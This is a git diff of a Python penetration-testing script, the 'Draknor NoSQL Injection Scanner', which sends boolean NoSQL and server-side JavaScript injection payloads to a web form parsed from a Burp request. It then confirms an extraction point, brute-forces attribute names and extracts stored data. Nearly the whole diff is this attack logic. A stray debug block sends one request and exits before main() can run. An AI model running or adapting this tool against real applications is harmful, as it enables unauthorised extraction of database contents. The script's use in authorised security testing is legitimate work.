@@ -5,6 +5,8 @@ from utils import *
 import re
 from burputils import *
 
+
+
 #TODO
 # implement custom fail string implementation
 # implement array payload handling
@@ -17,17 +19,14 @@ def scan_array_payloads():
         #      r_data = r_data.replace(f"§{index}§", payload)
     pass
 
-def scan_bool_payloads(attack_target,scan_param_name, baseline_response): 
-    print("[*] Starting bool payload scanning...")   
+def scan_bool_payloads(attack_target, baseline_response,debug=False): 
+    print(f"[*] Starting bool payload scanning with {len(bool_payloads)} payloads...")   
     success_payloads=[]
     error_payloads=[]
 
     for payload, extraction_payload in bool_payloads:        
-        # prepare data            
-        r_data = attack_target.parameters.replace(f"§{scan_param_name}§", quote(payload))
-
         #send request
-        response = send_post_request(attack_target, r_data)
+        response = send_post_request(attack_target, payload,debug=debug)
 
         #is request error
         if response.status_code != baseline_response.status_code:
@@ -41,12 +40,12 @@ def scan_bool_payloads(attack_target,scan_param_name, baseline_response):
     return success_payloads, error_payloads
 
 
-def verify_extraction_point(success_payloads, attack_target, scan_param_name, baseline_response):
-    print("[+] Verifing extraction point...")
+def verify_extraction_point(success_payloads, attack_target):
+    print("[+] Verifing SSJI extraction point...")
     for _, extraction_payload in success_payloads:         
         print(f"[*] Testing extraction payload: {extraction_payload}")
-        if send_extraction_request(attack_target, extraction_payload, "true", scan_param_name, baseline_response):                 
-            if not send_extraction_request(attack_target, extraction_payload, "false", scan_param_name, baseline_response):         
+        if send_extraction_request(attack_target, extraction_payload, "true"):                 
+            if not send_extraction_request(attack_target, extraction_payload, "false"):         
                 extraction_point = extraction_payload
                 break
 
@@ -88,6 +87,7 @@ def init():
     parser.add_argument('-p', '--parameter', help="Parameter to test")
     parser.add_argument('-f', '--fail_string', help="Response string for failed requests")
     parser.add_argument('-d', '--data', help="Post Data")
+    parser.add_argument('-v','--verbose', action='store_true', help="Show verbose debug")
     #parser.add_argument('--arrays', action='store_true', help="Activate array payloads")
     #parser.add_argument('--time', action='store_true', help="Activate time payload")
 
@@ -100,6 +100,7 @@ def init():
     form_extract_target=check_and_correct_url_schema(args.extract)
     burp_file_path=args.burp
     post_data=args.data
+    verbose=args.verbose
     fail_message=args.fail_string
     
 
@@ -122,9 +123,9 @@ def init():
         parser.print_help()
         raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
     
-    if scan_param_name and  f"§{scan_param_name}§" not in attack_target.parameters:
+    if scan_param_name and f"§{scan_param_name}§" not in attack_target.parameters:
         print(f"[*] Auto inserting placeholder in parameter {scan_param_name}...")
-        attack_target.parameters = replace_param_value(attack_target.parameters, scan_param_name)
+        attack_target.parameters = replace_param_value(attack_target.parameters, attack_target.request_body_type, scan_param_name)
 
     if not scan_param_name:
         print(f"[*] Auto extracting target parameter from supplied data {attack_target.parameters}...")
@@ -137,55 +138,66 @@ def init():
             scan_param_name = match.group(2)  
         else:
             raise Exception("Could not extract target parameter from parameter data. Format is name=§value§")
-        
-    return attack_target, scan_param_name
+    attack_target.scan_param_name = scan_param_name
+    return attack_target,verbose
 
 
 def main():
     print("--- Starting Draknor NoSQL Injection Scanner ---")
 
-    attack_target, scan_param_name = init()    
+    attack_target, debug = init()    
 
     print("[+] Attack target:", attack_target.http_verb,attack_target.get_target_url())
     print("[+] Parameters:", attack_target.parameters)
     print("[*] Checking if form target page is reflective...")
 
-    baseline_response = get_baseline_response(attack_target, scan_param_name)
+    baseline_response = get_baseline_response(attack_target,debug=debug)
     attack_target.set_baseline_response(baseline_response)
     print(f"[+] Set baseline response length to: {len(baseline_response.text)}")
     
     # Start Scanning
-    success_payloads, error_payloads = scan_bool_payloads(attack_target,scan_param_name, baseline_response)
+    success_payloads, error_payloads = scan_bool_payloads(attack_target, baseline_response,debug=debug)
 
-    # display results    
-    print("Successfull payloads:")
-    for p in success_payloads:
-        print(f"\t {p[0]}")
+    if error_payloads:
+        print("Error inflicting payloads:")
+        for p in error_payloads:
+            print(f"\t {p}")
         
-    print("Error inflicting payloads:")
-    for p in error_payloads:
-        print(f"\t {p}")
+    if success_payloads:      
+        print("Successfull payloads:")
+        for p in success_payloads:
+            print(f"\t {p[0]}")
         
+        # verify extraction point    
+        extraction_point = verify_extraction_point(success_payloads, attack_target)
 
-    # verify extraction point    
-    extraction_point = verify_extraction_point(success_payloads, attack_target, scan_param_name, baseline_response)
+        # enumerate attribute names
+        found_attributes = brute_attribute_names(attack_target, extraction_point)
 
-    # enumerate attribute names
-    found_attributes = brute_attribute_names(attack_target,scan_param_name, baseline_response, extraction_point)
-
-    # extract data
-    results = []
-    for attr, length in found_attributes:
-        res = brute_extract_data(attack_target,scan_param_name, baseline_response, extraction_point, attr, length)
-        if res:
-            print(f"[data] {attr}:{res}")   
-            results.append([attr, res])
-       
-    # print results
-    print_results(found_attributes, results)
+        # extract data
+        results = []
+        for attr, length in found_attributes:
+            res = brute_extract_data(attack_target, baseline_response, extraction_point, attr, length)
+            if res:
+                print(f"[data] {attr}:{res}")   
+                results.append([attr, res])
+            
+        # print results
+        print_results(found_attributes, results)
 
     #if args.arrays:  
     #    scan_array_payloads()
+    
+    else:        
+        print("[-] No successfull payloads found")
+
+
+t = create_attack_target_from_burp_data("draknor_input_json_succ.req")
+print(t)
+print(t.parameters["trackingNum"])
+send_post_request(t,t.parameters["trackingNum"], debug=True)
+exit()
+
 
 try:
     main()
@@ -194,3 +206,6 @@ except KeyboardInterrupt:
 except Exception as e:
     traceback.print_exc()   
     print("\n") 
+
+
+
